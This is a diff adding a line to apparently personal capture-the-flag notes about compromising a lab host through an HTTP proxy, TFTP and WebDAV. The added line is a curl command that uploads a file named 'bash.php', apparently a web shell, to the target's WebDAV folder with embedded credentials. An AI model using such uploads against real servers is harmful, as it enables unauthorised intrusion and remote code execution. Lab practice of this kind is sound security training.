@@ -248,3 +248,5 @@ use htp proxy to get ssh shell
 tftp to get root
 tftp is ftp whitout auth.
 
+curl --upload-file bash.php http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/
+
